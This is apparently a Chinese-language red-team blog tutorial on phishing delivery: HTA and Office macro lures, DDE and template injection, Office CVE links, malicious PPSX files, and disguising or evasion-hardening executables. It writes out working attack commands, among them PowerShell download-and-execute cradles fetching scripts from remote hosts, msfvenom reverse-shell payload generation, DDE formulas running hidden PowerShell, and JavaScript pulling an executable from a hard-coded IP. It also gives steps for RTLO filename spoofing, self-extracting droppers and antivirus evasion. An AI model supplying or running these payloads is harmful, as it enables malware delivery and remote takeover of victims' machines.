<h3 id="4）HTA钓鱼"><a href="#4）HTA钓鱼" class="headerlink" title="4）HTA钓鱼"></a>4）HTA钓鱼</h3><p>HTA 是 HTML Application 的缩写，直接将 HTML 保存成 HTA 的格式，是一个独立的应用软件。HTA虽然用HTML、JS和CSS编写，缺比普通网页权限大得多，它具有桌面程序的所有权限。就是一个 html 应用程序，双击就可以运行</p>
<p>正常是msf生成的hta文件弹shell，假设目标存在命令执行的漏洞，那么咱们在目标上执行如下即可返回msf的shell</p>
<p>mshta <a href="http://127.0.0.1:8080/xxx.hta">http://127.0.0.1:8080/xxx.hta</a></p>
<p>远程调用一般会被杀，最好本地运行</p>
<p>利用github开源项目可以绕过部分waf</p>
<p><a href="https://github.com/mdsecactivebreach/CACTUSTORCH">https://github.com/mdsecactivebreach/CACTUSTORCH</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006259.jpeg" alt="图片"></p>
<h3 id="5）宏钓鱼"><a href="#5）宏钓鱼" class="headerlink" title="5）宏钓鱼"></a>5）宏钓鱼</h3><p>正常操作是利用cs生成宏代码，复制到vb里面去</p>
<p>然后显示的是宏被禁用，为了增强迷惑性，可以进行编辑一下</p>
<p>首先在word选项中开启开发工具</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006260.jpeg" alt="图片"></p>
<p>然后把宏打开</p>
<p>创建一个 test.doc</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006261.jpeg" alt="图片"></p>
<p>然后点击 Visual Basic</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006262.jpeg" alt="图片"></p>
<p>使用Cobalt Strike 生成木马</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006263.jpeg" alt="图片"></p>
<p>点击添加一个监听端口，注意：如果端口在防火墙上策略有误，则会导致反弹失败</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006264.jpeg" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006365.jpeg" alt="图片"></p>
<p>将代码粘贴到刚才打开的地方</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006366.jpeg" alt="图片"></p>
<p>然后保存即可</p>
<p>doc格式和其它启用宏的模板的格式都可以</p>
<p>doc格式和原来格式的图标一样</p>
<p>运行文件，发现cs上线</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006367.jpeg" alt="图片"></p>
<p>可以使用EvilClippy进行免杀</p>
<p><a href="https://github.com/outflanknl/EvilClippy">https://github.com/outflanknl/EvilClippy</a></p>
<p>使用一个正常的vba文件和恶意文件来进行混淆，来躲避杀软检测</p>
<p>Excel文件也可以进行钓鱼</p>
<p>新建一个Excel，在左下角的sheet处右键单击，选择插入：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006368.jpeg" alt="图片"></p>
<p>在弹出的对话框中选择 MS Excel 4.0 宏表，点击确定</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006369.jpeg" alt="图片"></p>
<p>完成之后左下角多了一栏 宏</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006370.jpeg" alt="图片"></p>
<p>分别在A1和A2输入</p>
<p>&#x3D;exec(“c:\windows\system32\cmd.exe”)</p>
<p>&#x3D;halt()</p>
<p>并将A1改为Auto_Open，修改完回车，这样就可以一打开文件就加载指令最后保存为xlsm后缀的文件</p>
<p>这里的exec其实是执行的cmd命令，我们可以借此来上线CS等操作</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006371.jpeg" alt="图片"></p>
<h3 id="宏钓鱼-bypass-waf"><a href="#宏钓鱼-bypass-waf" class="headerlink" title="宏钓鱼 bypass waf"></a>宏钓鱼 bypass waf</h3><p>（1）使用远程加载XSL文件达到免杀</p>
<p><a href="https://github.com/sevagas/macro_pack">https://github.com/sevagas/macro_pack</a></p>
<p><a href="https://github.com/mdsecactivebreach/SharpShooter">https://github.com/mdsecactivebreach/SharpShooter</a></p>
<p>（2）高级VBA宏免杀</p>
<p>参考 <a href="https://www.certego.net/en/news/advanced-vba-macros/">https://www.certego.net/en/news/advanced-vba-macros/</a></p>
<h3 id="6）OLE（Object-Linking-and-Embedding，对象链接与嵌入）"><a href="#6）OLE（Object-Linking-and-Embedding，对象链接与嵌入）" class="headerlink" title="6）OLE（Object Linking and Embedding，对象链接与嵌入）"></a>6）OLE（Object Linking and Embedding，对象链接与嵌入）</h3><p>是一种把一个文件嵌入到另一个文件中的技术</p>
<p>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_http lhost&#x3D;ip lport&#x3D;port -f vbs -o payload.vbs</p>
<p>在开源的 openoffice 中可以直接只有DDE函数，像 &#x3D;DDE(“cmd”;”&#x2F;C calc”;”123”) 这样调用。而在正规的office套件中则移除了DDE函数，但是我们还是可以使用application|topic!item这一格式的三元表达式调用DDe。</p>
<p>注意：该方法的提示窗口只提示 application 而不提示 topic</p>
<p>excel：（如果前缀是”&#x3D;”、”+” 或 “-“，则将其余部分视为表达式）</p>
<p>&#x3D;cmd|’&#x2F;c powershell.exe -w hidden $e&#x3D;(New-Object System.Net.WebClient).DownloadString(“<a href="http://xxxx/getshell.ps1&quot;);IEX">http://XXXX/getshell.ps1&quot;);IEX</a> $e’!_xlbgnm.A1</p>
<p>word：</p>
<p>打开一个新的word文档，按下键盘的组合键 CTRL + F9 ，在文档中出现”{}”之后，将下面的这段代码复制到两个大括号之间</p>
<p>{ DDEAUTO c:\windows\system32\cmd.exe “&#x2F;k calc.exe” }</p>
<p>msf中可直接用，生成一个rtf文档，点击即可上线</p>
<p>use exploit&#x2F;windows&#x2F;fileformat&#x2F;office_dde_delivery</p>
<p>set lport 4444</p>
<p>set lhost xx.xx.xx.xx</p>
<h3 id="7）嵌入JS元素"><a href="#7）嵌入JS元素" class="headerlink" title="7）嵌入JS元素"></a>7）嵌入JS元素</h3><p>这个方式的原理是，如果我们往word中插进联机视频，那么再word的压缩包 word&#x2F;document.xml里的embeddedHtml项中会出现联机视频对应的内嵌html代码，我们可以通过修改这些代码，插入恶意js代码。</p>
<p>一般的利用方式是通过js下载恶意文件，但是似乎是因为word的一些保护机制，不能实现页面跳转或者自动点击下载等操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var a = document.createElement(&#x27;a&#x27;);</span><br><span class="line">console.log(a);</span><br><span class="line">document.body.appendChild(a);</span><br><span class="line">a.style = &#x27;display: none&#x27;;</span><br><span class="line">a.href = &quot;http://149.129.64.180/evil.exe&quot;;  //该行若存在，打开word文件会报错</span><br><span class="line">a.download = fileName;</span><br><span class="line">window.URL.revokeObjectURL(url);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">a.click();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="8）利用模板文件注入宏指令"><a href="#8）利用模板文件注入宏指令" class="headerlink" title="8）利用模板文件注入宏指令"></a>8）利用模板文件注入宏指令</h3><p>原理是，先创建一个带模板的文档，再创一个启用宏的模板文件。然后在带模板的文档的压缩包里面修改一些内容，使其指向的模板修改为我们自己创建的模板文件，这之间的过程可以由smb协议完成，故过查杀几率较高。</p>
<p>我们在启用宏的模板文件（doc3.dotm)里写入宏。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">Shell &quot;calc&quot;</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006472.jpeg" alt="图片"></p>
<h3 id="9）CVE"><a href="#9）CVE" class="headerlink" title="9）CVE"></a>9）CVE</h3><p>Office历史上出现的可导致远程命令执行的漏洞有很多、如：CVE-2017-0199、CVE-2017-8570、CVE-2017-8759、CVE-2017-11882、CVE-2018-0802 等</p>
<p>CVE-2017-0199</p>
<p><a href="https://github.com/bhdresh/CVE-2017-0199">https://github.com/bhdresh/CVE-2017-0199</a></p>
<p>影响版本：office 2016、2013、2010、2007</p>
<p>CVE-2017-11882</p>
<blockquote>
<p><a href="https://github.com/Ridter/CVE-2017-11882/">https://github.com/Ridter/CVE-2017-11882/</a></p>
</blockquote>
<p>影响版本：office 2016、2013、2010、2007、2003</p>
<p>CVE-2018-0802</p>
<blockquote>
<p><a href="https://github.com/rxwx/CVE-2018-0802">https://github.com/rxwx/CVE-2018-0802</a></p>
</blockquote>
<p>影响版本：office 2016、2013 Server Pack1、2010 Server Pack2、2007 Server Pack3</p>
<h2 id="2、伪造界面钓鱼"><a href="#2、伪造界面钓鱼" class="headerlink" title="2、伪造界面钓鱼"></a>2、伪造界面钓鱼</h2><h3 id="1）PPT动作按钮特性构造-PPSX-钓鱼"><a href="#1）PPT动作按钮特性构造-PPSX-钓鱼" class="headerlink" title="1）PPT动作按钮特性构造 PPSX 钓鱼"></a>1）PPT动作按钮特性构造 PPSX 钓鱼</h3><p>运行程序比如可以选用cs powershell 的代码。选择ppsx进行保存</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
<p>然后弹出的窗口处</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006473.jpeg" alt="图片"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://x.x.x.x:80/a&#x27;))&quot;</span><br><span class="line">powershell -NoP -NonI -W Hidden -Exec Bypass &quot;IEX (New-Object System.Net.WebClient).DownloadFile(&#x27;http:&#x27;+[char] 0x2F+[char] 0x2F+&#x27;cccn.nl&#x27;+[char] 0x2F+&#x27;c.php&#x27;,\&quot;$env:temp\ii.jse\&quot;); Invoke-Item \&quot;$env:temp\ii.jse\&quot;&quot;</span><br></pre></td></tr></table></figure>

<p>然后将格式保存为ppsx格式保存即可 执行即可上线</p>
<h2 id="3、exe等可执行文件"><a href="#3、exe等可执行文件" class="headerlink" title="3、exe等可执行文件"></a>3、exe等可执行文件</h2><h3 id="1）shellcode-异或加密免杀（golang）"><a href="#1）shellcode-异或加密免杀（golang）" class="headerlink" title="1）shellcode 异或加密免杀（golang）"></a>1）shellcode 异或加密免杀（golang）</h3><p>利用 msfvenom 生成一段 shellcode</p>
<p>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp -f num LHOST&#x3D;192.168.141.136 LPORT&#x3D;1234</p>
<p>利用 golang ，将shellcode进行异或</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006474.jpeg" alt="图片"></p>
<p>进行编译（在windows进行编译）</p>
<p>go build xxx.go运行即可</p>
<p>也可以利用aes加密等等</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
<h3 id="2）shellcode转换免杀"><a href="#2）shellcode转换免杀" class="headerlink" title="2）shellcode转换免杀"></a>2）shellcode转换免杀</h3><p>C#编译成exe -&gt; exe -&gt; 转js -&gt; js混淆</p>
<p>参考文章： <a href="https://wtfsec.org/posts/%E5%85%8D%E6%9D%80-msf-windows-payload-%E7%9A%84%E6%96%B9%E6%B3%95%E4%B8%8E%E5%AE%9E%E8%B7%B5/">https://wtfsec.org/posts/%E5%85%8D%E6%9D%80-msf-windows-payload-%E7%9A%84%E6%96%B9%E6%B3%95%E4%B8%8E%E5%AE%9E%E8%B7%B5/</a></p>
<p>利用DotNetToJScript转exe为js</p>
<blockquote>
<p><a href="https://github.com/tyranid/DotNetToJScript">https://github.com/tyranid/DotNetToJScript</a></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
<h3 id="3）shellcode编译免杀"><a href="#3）shellcode编译免杀" class="headerlink" title="3）shellcode编译免杀"></a>3）shellcode编译免杀</h3><p>使用msf生成一个PHP马（也可以其他语言的，比如perl啥的）</p>
<p>msfvenom -a x86 –platform Windows -p php&#x2F;meterpreter_reverse_tcp LHOST&#x3D;<Your IP Address>LPORT&#x3D;<Your Port to Connect On>-f raw &gt; shell.php</p>
<p>利用bamcompile将php转为exe</p>
<p>bamcompile -w -c shell.php shell.exe</p>
<h3 id="4）shellcode分离加载免杀"><a href="#4）shellcode分离加载免杀" class="headerlink" title="4）shellcode分离加载免杀"></a>4）shellcode分离加载免杀</h3><p>分离一般分2种，一个是远程加载shellcode，另外是通过运行程序的时候将加密数据传入</p>
<p>远程加载可以利用socket创建套接字或者直接http请求远程地址，钓鱼的时候可以将shellcode放在使用说明啥的</p>
<p>shellcode loader github开源项目很多</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006475.jpeg" alt="图片"></p>
<h3 id="5）绕过沙盒"><a href="#5）绕过沙盒" class="headerlink" title="5）绕过沙盒"></a>5）绕过沙盒</h3><p>主要思想：判断父进程是否为Debugger：在沙盒内被调试</p>
<p>判断时间是否被加速：一般沙盒内的程序时间都会加速</p>
<p>判断系统盘是否大于50GB：一个正常的PC的系统盘都会大于50GB</p>
<p>虚拟机其他特征</p>
<blockquote>
<p><a href="https://github.com/dycsy/ShellcodeLoader">https://github.com/dycsy/ShellcodeLoader</a></p>
<p><a href="https://github.com/1y0n/AV_Evasion_Tool">https://github.com/1y0n/AV_Evasion_Tool</a></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006476.jpeg" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
<h3 id="6）exe伪装"><a href="#6）exe伪装" class="headerlink" title="6）exe伪装"></a>6）exe伪装</h3><p>1、图标伪装</p>
<p>这里使用 Restorator 2018 小工具进行图标修改</p>
<blockquote>
<p><a href="http://www.pc6.com/softview/SoftView_585736.html">http://www.pc6.com/softview/SoftView_585736.html</a></p>
</blockquote>
<p>激活将附带的激活码填入即可</p>
<p>然后使用 Restorator 修改图标</p>
<p>直接点击exe文件拖入即可，如果没有图标文本的话，可以在电脑找一个exe格式的图标拖入，然后显示图标后复制过来即可</p>
<p>图标的话需要ico格式</p>
<p><a href="https://www.easyicon.net/iconsearch/%E2%BE%B3%E4%B9%90ico/">https://www.easyicon.net/iconsearch/⾳乐ico/</a></p>
<p><a href="http://www.bitbug.net/%E5%9C%A8%E7%BA%BF%E5%88%B6%E4%BD%9Cico%E5%9B%BE%E6%A0%87">http://www.bitbug.net/在线制作ico图标</a></p>
<p>在这⾥下载图标，并在bitbug转换格式即可！</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006577.jpeg" alt="图片"></p>
<p>更改图标直接再图标处右键导入</p>
<p>2、RTLO</p>
<p>通过重命名，在a后面右键，插入Unicode控制字符 -&gt; RLO</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006578.jpeg" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006579.jpeg" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006580.jpeg" alt="图片"></p>
<p>实测钓鱼方式有些古老，不管是不是病毒只要使用此方式伪装，360都会查杀</p>
<p>3、rar解压自运行</p>
<p>木马文件：artifact.exe 迷惑文件：calc.exe</p>
<p>进入winrar，选中这两个文件，右键添加至压缩包，创建自解压格式压缩文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
<p>高级 -&gt; 自解压选项 -&gt; 设置</p>
<p>提取前打开伪装文件，提取后运行马</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
<p>模式 -&gt; 全部隐藏</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006581.jpeg" alt="图片"></p>
<p>更新 -&gt; 解压并更新文件，覆盖所有文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006582.jpeg" alt="图片"></p>
<p>双击可以打开计算机，CS上线</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8B%E9%92%93%E9%B1%BC%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E9%92%93%E9%B1%BC%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/640-165457332006583.jpeg" alt="图片"></p>
<h3 id="7）绕过行为检测"><a href="#7）绕过行为检测" class="headerlink" title="7）绕过行为检测"></a>7）绕过行为检测</h3><p>部分敏感行为可操作windowsAPI</p>
<p>比如360对添加用户会拦截</p>
<p>可以操作以下两个API绕过</p>
<p>NetUserAdd</p>
<p>NetLocalGroupAddMembers</p>
<p>其他的免杀还有内存（一般可用壳，但大多基本壳都在waf的特征库中）、花指令等等</p>
<h3 id="8）DLL劫持-重新制作安装包"><a href="#8）DLL劫持-重新制作安装包" class="headerlink" title="8）DLL劫持+重新制作安装包"></a>8）DLL劫持+重新制作安装包</h3><p>DLL劫持指的是病毒通过一些手段来劫持或者替换正常的DLL，欺骗正常程序预先准备好的恶意DLL</p>
<p>如下面图片中的，LPK.dll是应用程序运行所需要加载的DLL，该系统文件默认在C:\Winodws\system32路径下，但由于windows优先搜索当前路径，所以当我们把恶意LPK.dll放在应用程序同一路径下，便会被程序成功加载，从而执行恶意操作</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片"></p>
<p>在蓝队可以利用此方法反制红队，例如在准备好的虚拟机中点击红队的钓鱼邮件，并准备一些让红队感兴趣的东西</p>
<p>比如梯子的安装包以及梯子的账号密码</p>
<p>这里可能会用到拿破轮胎大佬写的DLL注入工具</p>
